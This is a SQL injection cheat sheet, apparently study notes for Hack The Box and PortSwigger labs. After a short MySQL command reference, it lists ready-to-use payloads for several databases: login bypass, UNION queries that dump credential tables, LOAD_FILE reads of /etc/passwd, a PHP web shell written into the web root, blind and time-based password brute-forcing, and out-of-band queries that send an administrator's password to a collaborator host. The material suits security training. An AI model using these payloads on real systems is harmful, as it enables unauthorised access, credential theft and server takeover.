## MySQL

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |

## MySQL Operator Precedence
* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

## SQL Injection
| **Payload** | **Description** |
| ---- | ---- |
| **Auth Bypass** |  |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |  |
| **Union Injection (mysql) ** |  |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |  |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |  |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |  |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |

---

| Oracle                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Microsoft                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | PostgresQL                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Mysql                                                                                                                                                                                                                                                                                                                                                                                                                   | Description                                                                                                                                                                                                                                                                                                                 |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `'foo'\|\|'bar'`<br>=> `foobar`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | `'foo'+'bar'`<br>=> `foobar`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | `'foo'\|\|'bar'`<br>=> `foobar`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | `'foo' 'bar'`<br>`CONCAT('foo','bar')`<br>=> `foobar`                                                                                                                                                                                                                                                                                                                                                                   | Concatenate strings                                                                                                                                                                                                                                                                                                         |
| `SUBSTR('foobar', 4, 2)`<br>=> `ba`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | `SUBSTRING('foobar', 4, 2)`<br>=> `ba`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | `SUBSTRING('foobar', 4, 2)`<br>=> `ba`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | `SUBSTRING('foobar', 4, 2)`<br>=> `ba`                                                                                                                                                                                                                                                                                                                                                                                  | Extract part of a string.                                                                                                                                                                                                                                                                                                   |
| --comment                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | --comment<br>/\*comment\*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | --comment<br>/\*comment\*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | \#comment<br>-- comment <br>[Note the space after the double dash]<br>/\*comment\*/                                                                                                                                                                                                                                                                                                                                     | Comments to truncate a query.                                                                                                                                                                                                                                                                                               |
| `x' UNION SELECT NULL,NULL,NULL--`<br>`' UNION SELECT NULL,'toto',NULL--`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Number of colums :<br>`x' UNION SELECT NULL,NULL,NULL--`<br>Inject a string to see if an error occurs :<br>`' UNION SELECT NULL,'toto',NULL--`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Number of colums :<br>`x' UNION SELECT NULL,NULL,NULL--`<br>Inject a string to see if an error occurs :<br>`' UNION SELECT NULL,'toto',NULL--`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Number of colums :<br>`x' UNION SELECT NULL,NULL,NULL--`<br>Inject a string to see if an error occurs :<br>`' UNION SELECT NULL,'toto',NULL--`                                                                                                                                                                                                                                                                          | Define the number of columns in a table with UNION injection.<br>Then define which column is text. [See this labs.](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)                                                                                                       |
| `x' UNION SELECT banner FROM v$version--`<br>`x' UNION SELECT version, NULL FROM v$instance--`<br>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | `x' UNION SELECT @@version, NULL--`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | `x' UNION SELECT version(), NULL--`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | `x' UNION SELECT @@version, NULL-- `                                                                                                                                                                                                                                                                                                                                                                                    | Database Version extraction  via UNION injection with two columns. [See this labs](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle).                                                                                                                         |
| `x' UNION SELECT table_name,NULL FROM all_tables--`<br>`x' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'--`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | `x' UNION SELECT table_name, NULL FROM information_schema.tables--`<br>`x' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='TABLE-NAME-HERE'--`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | `x' UNION SELECT table_name, NULL FROM information_schema.tables--`<br>`x' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='TABLE-NAME-HERE'--`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | `x' UNION SELECT table_name, NULL FROM information_schema.tables--`<br>`x' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='TABLE-NAME-HERE'-- `                                                                                                                                                                                                                                        | List database Content.<br>[See this lab for non oracle db.](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)<br>[This on for oracle db.](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle) |
| Test if the webapp is vulnerable :<br>`z' AND '1'='1`<br>=> `Welcome Back!`<br>`z' AND '1'='2`<br>=> Nothing.<br><br>Guess length :<br><br>`x' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>5)='a`<br>=> `Welcome Back!`<br><br>Guess char at offset x :<br><br>`x' AND (SELECT SUBSTR(password,x,1) FROM users WHERE username='administrator')='z`<br>=> `Welcome Back !`<br><br>                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Test if the webapp is vulnerable :<br>`z' AND '1'='1`<br>=> `Welcome Back!`<br>`z' AND '1'='2`<br>=> Nothing.<br><br>Guess length :<br><br>`x' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>5)='a`<br>=> `Welcome Back!`<br><br>Guess char at offset x :<br><br>`x' AND (SELECT SUBSTRING(password,x,1) FROM users WHERE username='administrator')='z`<br>=> `Welcome Back !`<br><br>                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | Test if the webapp is vulnerable :<br>`z' AND '1'='1`<br>=> `Welcome Back!`<br>`z' AND '1'='2`<br>=> Nothing.<br><br>Guess length :<br><br>`x' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>5)='a`<br>=> `Welcome Back!`<br><br>Guess char at offset x :<br><br>`x' AND (SELECT SUBSTRING(password,x,1) FROM users WHERE username='administrator')='z`<br>=> `Welcome Back !`<br><br>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Test if the webapp is vulnerable :<br>`z' AND '1'='1`<br>=> `Welcome Back!`<br>`z' AND '1'='2`<br>=> Nothing.<br><br>Guess length :<br><br>`x' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>5)='a`<br>=> `Welcome Back!`<br><br>Guess char at offset x :<br><br>`x' AND (SELECT SUBSTRING(password,x,1) FROM users WHERE username='administrator')='z`<br>=> `Welcome Back !`<br><br> | Conditionnal response.<br><br>1) Detect if the app is vulnerable to conditionnal response.<br>2) Guess the length of the password.<br>3) Bruteforce the password.<br>[See this Labs.](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)                                                   |
| Test if the app is vulnerable :<br>`z'`<br>=> Error<br>`z''`<br>=> Nothing<br>`z'\|\|(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)\|\|'`<br>=> Error<br>`z'\|\|(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)\|\|'`<br>=> Nothing<br><br>Guess length :<br>`z'\|\|(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')\|\|'`<br>=> Error (the password is greater than 1)<br>`z'\|\|(SELECT CASE WHEN LENGTH(password)>20 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')\|\|'`<br>=> Nothing (the password is lesser than 21)<br><br>Guess char at offset `x`:<br><br>`z'\|\|(SELECT CASE WHEN SUBSTR(password,x,1)='a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')\|\|'`<br>=> Error, the password at offset `x` contain the letter `a`. | Test if the app is vulnerable :<br>`z'`<br>=> Error<br>`z''`<br>=> Nothing<br><br>*Note : for microsoft sql, we must put nothing before the concatenation, because if an error occurs (ie. 1/0), it will try to cast the string before the query to an int. Ie, cast the letter 'z' to an int and therefore leading to a generic error.*<br><br>`'+(SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)+'`<br>=> Error<br>`'+(SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END)+'`<br>=> Nothing<br><br>Guess length :<br>`'+(SELECT CASE WHEN (username='administrator' AND LEN(password)=10) THEN 1/0 ELSE NULL END FROM users)+'`<br>=> Error (len of the password is 10)<br><br>Guess char at offset `x`:<br><br>`'+(SELECT CASE WHEN SUBSTRING(password,x,1)='a' THEN 1/0 ELSE NULL END FROM users WHERE username='administrator')+'`<br>=> Error, the password at offset `x` contain the letter `a`. | Test if the app is vulnerable :<br>`z'`<br>=> Error<br>`z''`<br>=> Nothing<br><br>*Note : for postgresQL, we must put nothing before the concatenation, because if an error occurs (ie. 1/0), it will try to cast the string before the query to an int. Ie, cast the letter 'z' to an int and therefore leading to a generic error.*<br><br>`'\|\|(SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)\|\|'`<br>=> Error<br>`'\|\|(SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)\|\|'`<br>=> Nothing<br><br>Guess length :<br>`'\|\|(SELECT CASE WHEN LENGTH(password)=10 THEN 1/(SELECT 0) ELSE NULL END FROM users WHERE username='administrator')\|\|'`<br>=> Error (len of the password is 10)<br><br>Guess char at offset `x`:<br><br>`'\|\|(SELECT CASE WHEN SUBSTRING(password,x,1)='a' THEN 1/(SELECT 0) ELSE NULL END FROM users WHERE username='administrator')\|\|'`<br>=> Error, the password at offset `x` contain the letter `a`.                  | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`                                                                                                                                                                                                                                                                                                                                 | Conditionnal error.<br><br>1) Detect if the app is vulnerable to conditionnal error.<br>2) Guess the length of the password.<br>3) Bruteforce the password.<br>[See this Labs.](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)                                                            |
| N/A                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | `' WHERE 1=(SELECT TOP 1 username FROM users)--`<br>=> `Token error: 'Conversion failed when converting the varchar value 'admin' to data type int.' on server 2d8fde58ffb1 executing on line 1 (code: 245, state: 1, class: 16)`<br><br>`' WHERE 1=(SELECT TOP 1 password FROM users)--`<br>=> `Token error: 'Conversion failed when converting the varchar value 'mypassword' to data type int.' on server 2d8fde58ffb1 executing on line 1 (code: 245, state: 1, class: 16)`                                                                                                                                                                                                                                                                                                                                                                                                                    | `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`<br>=> `ERROR: invalid input syntax for type integer: "admin"`<br><br>`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`<br>=> `ERROR: invalid input syntax for type integer: "password"`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | `' WHERE 1=1 and EXTRACTVALUE(1, CONCAT(0x5c, (SELECT username FROM users LIMIT 1)))-- `<br>=> `Server error: ERROR HY000 (1105): XPATH syntax error: '\admin'`<br><br>`' WHERE 1=1 and EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users LIMIT 1)))-- `<br>=> `Server error: ERROR HY000 (1105): XPATH syntax error: '\mypassword'`                                                                             | Extracting data via visible error messages                                                                                                                                                                                                                                                                                  |
| N/A                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | `QUERY-1-HERE; QUERY-2-HERE`<br><br>`QUERY-1-HERE QUERY-2-HERE`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | `QUERY-1-HERE; QUERY-2-HERE`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | `QUERY-1-HERE; QUERY-2-HERE`<br><br>*Note : Batched queries cannot be used for sql injection with MySQL, but sometimes it can be used by certain php application or python API to communicate with a MYSQL Database.*                                                                                                                                                                                                   | Batched queries (the hability to make multiple queries, one after another)                                                                                                                                                                                                                                                  |
| `dbms_pipe.receive_message(('a'),10)`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | `WAITFOR DELAY '0:0:10'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | `SELECT pg_sleep(10)`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | `SELECT SLEEP(10)`                                                                                                                                                                                                                                                                                                                                                                                                      | Time delay (10 seconds here).                                                                                                                                                                                                                                                                                               |
| `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Test if the app is vulnerable :<br>`';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`<br>=> 10 seconds of delay for response<br><br>`';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--`<br>=> No delay for response<br><br>`';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`<br>=> 10 seconds of delay for response<br><br>`';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`<br>=> No delay. Password's length is lesser than 21.<br><br>Test if the letter a is presents at offset x :<br>`';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,x,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`<br><br>*Note : of course you can use burp intruder to do this instead to do it manually. **But** you need to set the Maximum concurrent Request to **1** to avoid false positives.* | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                                                                                                                                                                                                                                                                                                                          | Conditional time delays. You can adapt the payload from the conditionnal errors part.<br><br>[See this lab to train](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval).                                                                                                              |
| Via XXE :<br><br>`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br><br>The following technic requires elevated privileges to be performed :<br><br>`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | Windows Only :<br><br>`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`  <br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                                                                                                              | Out-of-band (OOB) interaction.                                                                                                                                                                                                                                                                                              |
| Via XXE :<br><br>`' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT password FROM users WHERE username='administrator')\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | `create OR replace function f() returns void as $$   declare c text;   declare p text;   begin   SELECT into p (SELECT YOUR-QUERY-HERE);   c := 'copy (SELECT '''') to program ''nslookup '\|\|p\|\|'.BURP-COLLABORATOR-SUBDOMAIN''';   execute c;   END;   $$ language plpgsql security definer;   SELECT f();`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | Windows Only :<br><br>`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                                                                                                                                                         | Out-of-band (OOB) interaction  with data exfiltration.                                                                                                                                                                                                                                                                      |

